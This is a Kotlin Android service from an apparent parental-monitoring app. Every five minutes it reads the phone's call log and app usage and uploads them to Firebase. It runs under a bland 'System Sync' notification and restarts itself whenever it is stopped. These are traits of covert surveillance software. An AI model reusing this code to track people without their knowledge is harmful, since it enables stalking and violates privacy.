package com.parentalguard.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import com.parentalguard.utils.AppConfig
import com.parentalguard.utils.FirebaseHelper
import com.parentalguard.utils.UsageStatsHelper
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * ============================================================
 * CallLogSyncService.kt
 * Package: com.parentalguard.services
 *
 * PURPOSE:
 *   A background Foreground Service that runs a repeating task
 *   every 5 minutes to collect and upload two types of data:
 *     1. CALL LOGS — who was called, when, for how long
 *     2. SCREEN TIME — which apps were used today and for how long
 *
 * HOW THE TIMER WORKS:
 *   We use Android's Handler + Runnable pattern for the repeating
 *   task. This is simpler than AlarmManager for in-process timing:
 *
 *     handler.post(syncRunnable)   → run now
 *     syncRunnable runs...
 *     ...then calls handler.postDelayed(syncRunnable, 5min)  → schedule next run
 *
 *   This creates a self-scheduling loop that repeats indefinitely.
 *
 * WHY NOT WorkManager OR AlarmManager?
 *   WorkManager is better for tasks that must survive app death
 *   (e.g. upload a file when internet returns). Our services already
 *   restart themselves via BootReceiver and START_STICKY, so Handler
 *   is simpler and sufficient here.
 * ============================================================
 */
class CallLogSyncService : Service() {

    companion object {
        private const val TAG = "CallLogSyncService"
    }

    // Handler tied to the main thread's message queue.
    // We'll use it to schedule the repeating sync task.
    private val handler = Handler(Looper.getMainLooper())

    /**
     * The repeating task (Runnable) that runs every 5 minutes.
     *
     * It's defined as a property so we can:
     *   1. Reference "this" inside the lambda (to re-schedule itself)
     *   2. Pass it to handler.removeCallbacks() in onDestroy()
     */
    private val syncRunnable = object : Runnable {
        override fun run() {
            Log.d(TAG, "Running scheduled sync...")

            // Sync call logs to Firebase
            syncCallLogs()

            // Sync app screen time to Firebase
            syncScreenTime()

            // Schedule the next run after the configured interval (5 minutes)
            // This is how the loop continues — each run schedules the next.
            handler.postDelayed(this, AppConfig.SYNC_INTERVAL_MS)
        }
    }

    // ----------------------------------------------------------
    // SERVICE LIFECYCLE
    // ----------------------------------------------------------

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Must call startForeground() within 5 seconds on Android 12+
        startForeground(
            AppConfig.NOTIFICATION_ID_CALL_SYNC,
            buildNotification()
        )

        Log.d(TAG, "CallLogSyncService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start the repeating sync immediately (post with no delay = run now)
        handler.post(syncRunnable)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ----------------------------------------------------------
    // CALL LOG SYNC
    // ----------------------------------------------------------

    /**
     * Reads the device's call log using Android's ContentProvider API
     * and sends the data to Firebase.
     *
     * ContentProviders are Android's way of sharing structured data
     * between apps. CallLog.Calls.CONTENT_URI is a built-in URI that
     * gives access to the system call log database.
     *
     * Requires: READ_CALL_LOG + READ_CONTACTS permissions
     */
    private fun syncCallLogs() {
        try {
            val callLogs = mutableListOf<Map<String, Any>>()

            // Query the system call log ContentProvider.
            // This is similar to a SQL SELECT query:
            //   SELECT * FROM call_log ORDER BY date DESC LIMIT 100
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,   // The "table" to query
                null,                         // null = select all columns
                null,                         // no WHERE filter
                null,                         // no WHERE args
                "${CallLog.Calls.DATE} DESC LIMIT ${AppConfig.MAX_CALL_LOG_ENTRIES}"
            )

            // cursor?.use{} = safely open and auto-close the cursor
            // (like try-with-resources in Java)
            cursor?.use { c ->
                // Get column indices once — more efficient than looking up
                // the column index inside the loop for every row
                val colNumber   = c.getColumnIndex(CallLog.Calls.NUMBER)
                val colName     = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val colType     = c.getColumnIndex(CallLog.Calls.TYPE)
                val colDate     = c.getColumnIndex(CallLog.Calls.DATE)
                val colDuration = c.getColumnIndex(CallLog.Calls.DURATION)

                // Loop through each call log entry
                while (c.moveToNext()) {

                    // Convert the integer call type to a readable label
                    val callType = when (c.getInt(colType)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE   -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else                        -> "Unknown"
                    }

                    // The date column stores Unix epoch time in milliseconds
                    val dateMs  = c.getLong(colDate)
                    val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(Date(dateMs))

                    // Format duration from total seconds → "MM:SS"
                    val durationSecs = c.getLong(colDuration)
                    val durationFormatted = String.format(
                        "%02d:%02d",
                        TimeUnit.SECONDS.toMinutes(durationSecs),  // minutes part
                        durationSecs % 60                           // seconds part
                    )

                    // Build a Map for this call entry
                    callLogs.add(
                        mapOf(
                            "number"          to (c.getString(colNumber) ?: "Unknown"),
                            "name"            to (c.getString(colName)   ?: "Unknown"),
                            "type"            to callType,
                            "date"            to dateStr,
                            "duration"        to durationFormatted,
                            "durationSeconds" to durationSecs
                        )
                    )
                }
            }

            if (callLogs.isNotEmpty()) {
                FirebaseHelper.saveCallLogs(callLogs)
                Log.d(TAG, "Call log sync complete: ${callLogs.size} calls")
            } else {
                Log.d(TAG, "No calls to sync")
            }

        } catch (e: SecurityException) {
            // User revoked READ_CALL_LOG permission
            Log.e(TAG, "Call log permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error reading call log: ${e.message}")
        }
    }

    // ----------------------------------------------------------
    // SCREEN TIME SYNC
    // ----------------------------------------------------------

    /**
     * Reads today's app usage statistics and sends them to Firebase.
     *
     * Delegates to UsageStatsHelper which handles all the
     * UsageStatsManager API complexity.
     *
     * Requires: PACKAGE_USAGE_STATS permission (manually granted in Settings)
     */
    private fun syncScreenTime() {
        try {
            val appUsageList = UsageStatsHelper.getAppUsageStats(this)

            if (appUsageList.isNotEmpty()) {
                FirebaseHelper.saveScreenTime(appUsageList)
                Log.d(TAG, "Screen time sync complete: ${appUsageList.size} apps")
            } else {
                // Either no apps used today, or the permission wasn't granted
                Log.w(TAG, "No screen time data — is Usage Access permission enabled?")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error syncing screen time: ${e.message}")
        }
    }

    // ----------------------------------------------------------
    // NOTIFICATION
    // ----------------------------------------------------------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                AppConfig.CHANNEL_ID_SYNC,
                "Data Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Syncs call logs and app usage"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, AppConfig.CHANNEL_ID_SYNC)
            .setContentTitle("System Sync")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    // ----------------------------------------------------------
    // CLEANUP
    // ----------------------------------------------------------

    override fun onDestroy() {
        super.onDestroy()

        // Cancel all pending sync tasks to avoid memory leaks
        handler.removeCallbacks(syncRunnable)

        Log.d(TAG, "CallLogSyncService destroyed — restarting...")

        // Self-restart for resilience (same pattern as LocationTrackingService)
        startService(Intent(this, CallLogSyncService::class.java))
    }
}
